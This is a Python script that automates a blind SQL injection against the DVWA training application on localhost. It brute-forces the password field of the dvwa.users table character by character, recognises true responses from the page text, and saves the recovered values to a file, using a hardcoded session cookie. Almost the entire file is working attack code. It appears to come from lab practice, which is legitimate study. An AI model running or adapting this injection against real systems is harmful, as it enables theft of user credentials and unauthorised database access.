#!/usr/bin/python3

import string, requests, sys, signal
from pwn import log

# Ctrl + C
def signal_handler(signal, frame):
    print("\n[!] Exiting ...")
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

# Global Variables
char_pool = string.ascii_lowercase + string.digits + "_-;"# string.printable would be optimal
#main_url = "http://localhost/vulnerabilities/sqli_blind/?id=3' and (select substring(user,1,1) from users limit 1)='{char}'-- -&Submit=Submit"

cookies = {
    'PHPSESSID': 'j5m7ggaraik6e89v5h5ofpo542',
    'security': 'low'
}

def storeResult(result):
    print(f"\n[+] Found: {result}\n[+] Writing to a file...")
    with open("output.txt", "a") as f:
        f.write(f"{result}\n")

def bruteForce():

    result=""
    p1 = log.progress("Brute Force")
    p1.status("Starting brute force attack")
    p2 = log.progress("Result")

    done = False
    offset = 0
    while not done: # Iterate offset
        found = False
        index = 1
        result = ""
        while not found: # Iterate index
                for char in char_pool: # Iterate char
                    main_url = f"http://localhost/vulnerabilities/sqli_blind/?id=3' and (select substring(password,{index},1) from dvwa.users limit 1 offset {offset})='{char}'-- -&Submit=Submit"
                    p1.status(main_url)

                    response = requests.get(main_url, allow_redirects=True, cookies=cookies)

                    if "User ID exists in the database." in response.text: # If the response contains the text the result of the query is true
                        result += char # Append the char to the result
                        p2.status(result)
                        break
                else:
                    storeResult(result)
                    found = True # when the for loops thru all chars and doesn't find a match, we assume the string ended and store the result
                index+=1
        offset+=1
        if result == "":
            done = True # we assume the offset is high enough when the result variable hasn't changed after iterating thru the inner loops

if __name__ == "__main__":
    bruteForce()
